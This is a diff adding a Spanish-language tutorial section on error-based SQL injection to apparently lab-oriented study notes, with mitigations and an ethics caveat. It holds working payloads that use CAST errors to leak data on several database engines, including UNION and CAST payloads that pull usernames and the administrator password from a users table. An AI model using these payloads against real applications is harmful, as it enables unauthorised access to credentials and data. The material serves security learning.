@@ -89,7 +89,203 @@ Esto convierte una blind SQLi en visible.
 
 ---
 
-### 3. Basada en tiempos (Time-based)
+### 3. Extraer datos a través de mensajes de error SQL verbosos
+
+
+
+Un mensaje de error SQL verboso es una respuesta que incluye detalles internos de la consulta que la aplicación construyó y/o los valores que provocaron el error. Esto suele ser consecuencia de configuraciones de depuración activadas o mala práctica.
+
+Estos mensajes pueden revelar:
+
+* la **estructura completa** de la consulta SQL construida por la app (columnas, cláusulas);
+* la **posición** donde tu entrada fue insertada (p.ej. dentro de comillas);
+* **valores** retornados por subqueries (si el error incluye esos valores).
+
+Con esta información, una vulnerabilidad que era "blind" puede transformarse en "visible" y facilitar la explotación.
+
+---
+
+## 2) Ejemplo típico: "Unterminated string literal"
+
+Si inyectás una comilla simple (`'`) en un parámetro `id` y la app devuelve:
+
+```
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+```
+
+Interpretación:
+
+* La app te muestra **la consulta completa** que ejecutó: `SELECT * FROM tracking WHERE id = '` + tu input.
+* Vemos que el parámetro fue insertado **dentro de una cadena** entrecomillada con `'` (single-quoted string).
+* Con esa pista, ahora sabés cómo cerrar la comilla y cómo comentar el resto de la consulta (`-- ` o `/* */`) para manipular la sintaxis sin romperla.
+
+**Qué hacer con esta información:**
+
+* Si la app mantiene esa verbosidad, podés adaptar payloads con confianza (cerrar comillas, usar `UNION`, etc.).
+
+---
+
+## 3) Forzar errores que revelen datos: rol de `CAST()`
+
+`CAST(expr AS type)` convierte `expr` a `type`. Si `expr` tiene un formato no convertible al tipo destino, el motor lanzará un error que **puede incluir el valor original**.
+
+Ejemplo conceptual:
+
+```sql
+CAST((SELECT example_column FROM example_table) AS int)
+```
+
+Si `example_column` contiene la cadena `Example data`, intentar convertirla a entero (`int`) puede producir un error como:
+
+```
+ERROR: invalid input syntax for type integer: "Example data"
+```
+
+Este mensaje revela el contenido de `example_column`.
+
+**Por qué es útil:** convierte una subconsulta que devuelve un string en una fuente de información visible — el error muestra la cadena.
+
+---
+
+## 4) Sintaxis y comportamiento por SGBD
+
+> Atención: hay diferencias en funciones y mensajes; adapta payloads por motor.
+
+### 4.1 MySQL
+
+* `CAST(expr AS SIGNED)` o `CAST(expr AS UNSIGNED)` o `CAST(expr AS DECIMAL)` puede provocar errores de conversión. Mensajes pueden ser menos verbosos según configuración.
+* Alternativas específicas para MySQL: `UPDATEXML()` o `EXTRACTVALUE()` con subselects pueden producir errores que contienen los datos.
+
+**Ejemplo MySQL:**
+
+```sql
+' AND (SELECT CAST((SELECT some_column FROM some_table LIMIT 1) AS SIGNED))--
+```
+
+Si `some_column` = 'abc', es probable que se produzca un error del tipo “invalid integer” que incluya 'abc'.
+
+### 4.2 PostgreSQL
+
+* `CAST(expr AS INTEGER)` o `expr::integer` provoca `invalid input syntax for integer: "..."` mostrando el texto no convertible.
+
+**Ejemplo Postgres:**
+
+```sql
+' AND (SELECT CAST((SELECT column FROM table LIMIT 1) AS INTEGER))--
+```
+
+Si devuelve texto, el error suele mostrar exactamente el texto que falló.
+
+### 4.3 Microsoft SQL Server
+
+* `CAST(expr AS INT)` o `CONVERT(INT, expr)` pueden lanzar errores parecidos a `Conversion failed when converting the varchar value '...' to data type int.` que incluyen el valor.
+
+**Ejemplo MSSQL:**
+
+```sql
+' AND (SELECT CAST((SELECT TOP 1 column FROM table) AS INT))--
+```
+
+### 4.4 Oracle
+
+* `CAST(expr AS NUMBER)` puede lanzar `ORA-01722: invalid number` y a veces mostrar el valor problemático según contexto. Oracle suele ser menos verboso por defecto.
+* Recordá que en Oracle hay que usar `FROM DUAL` para selects que no leen tablas.
+
+**Ejemplo Oracle:**
+
+```sql
+' AND (SELECT CAST((SELECT column FROM users WHERE ROWNUM=1) AS NUMBER) FROM DUAL)--
+```
+
+### 4.5 SQLite
+
+* `CAST(expr AS INTEGER)` produce `datatype mismatch` o errores que incluyen el texto.
+
+---
+
+## 5) Cómo formar un payload efectivo
+
+1. **Identifica contexto**: ¿estás dentro de comillas? ¿en WHERE, in SELECT, in FROM? Un mensaje de error tipo "unterminated string" ya lo dice.
+2. **Usa `CAST()`** para convertir la salida de una subconsulta a un tipo incompatible y provocar error que contenga el valor.
+3. **Controla filas**: usa `LIMIT 1` / `TOP 1` / `ROWNUM=1` para que la subconsulta no devuelva múltiples filas y lance error de subquery multivalued.
+4. **Comenta el resto**: si necesitas cerrar la comilla abierta y evitar que la aplicación agregue más SQL, termina con `-- ` o con el comentario de bloque.
+5. **Observa el mensaje** y extrae el valor mostrado.
+
+**Payload plantilla (MySQL/Postgres style)**
+
+```
+?id=1' AND (SELECT CAST((SELECT column FROM users LIMIT 1) AS INTEGER))--
+```
+
+Si `column` contiene 's3cret', el DB puede responder con `invalid input syntax for integer: "s3cret"` y así lo ves.
+
+---
+
+## 6) Ejemplos concretos y anotados
+
+### Caso A — detectando contexto con "unterminated string"
+
+1. Inyectás `'` en `?id=1`.
+2. La app devuelve: `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''`.
+3. Conclusión: el parámetro fue insertado dentro de una cadena `'...'` en la consulta. Ahora puedes cerrar esa comilla y comentar el resto para inyectar:
+
+```
+?id=1' UNION SELECT username, password FROM users --
+```
+
+(si la estructura de columnas lo permite).
+
+### Caso B — usar `CAST()` para ver un valor
+
+```
+?id=1' AND CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS INTEGER)--
+```
+
+Respuesta (ejemplo Postgres):
+
+```
+ERROR: invalid input syntax for integer: "S3curePwd"
+```
+
+Resultado: obtuviste el valor "S3curePwd" en el mensaje de error.
+
+---
+
+## 7) Limitaciones y consideraciones éticas
+
+* **Depende de la configuración**: muchas apps en producción no muestran errores completos; los mensajes pueden estar suprimidos.
+* **No siempre verás el valor completo**: algunos motores truncarán o sanearán el mensaje.
+* **No es universal**: algunos SGBD o versiones no muestran el valor en el error.
+* **Ética**: sólo probar en entornos autorizados. Forzar errores en producción puede afectar disponibilidad o integridad.
+
+---
+
+## 8) Defensa y mitigaciones específicas
+
+* **No mostrar errores verbosos al usuario**. Registrar internamente.
+* **Validación y saneamiento de entrada**; prepared statements.
+* **Menor privilegio** y minimizar funciones peligrosas.
+* **WAF y monitoreo**: detectar intentos de forzar errores (múltiples `CAST`/`1/0`).
+
+---
+
+## 9) Checklist rápido para exploiters (labs)
+
+* [ ] Identificar contexto (¿dentro de comillas?).
+* [ ] Probar `CAST(... AS INT)` / `CONVERT` o triggers de error seguros.
+* [ ] Usar `LIMIT 1`/`TOP 1`/`ROWNUM=1` para una sola fila.
+* [ ] URL-encodear payload y comentar el resto de la consulta.
+* [ ] Analizar el mensaje y adaptar la extracción (iterar si se necesita exfiltrar más datos).
+
+---
+
+
+---
+
+
+---
+
+### 4. Basada en tiempos (Time-based)
 
 Si la app no muestra errores y el comportamiento no cambia, se fuerza un **retraso condicional**:
 
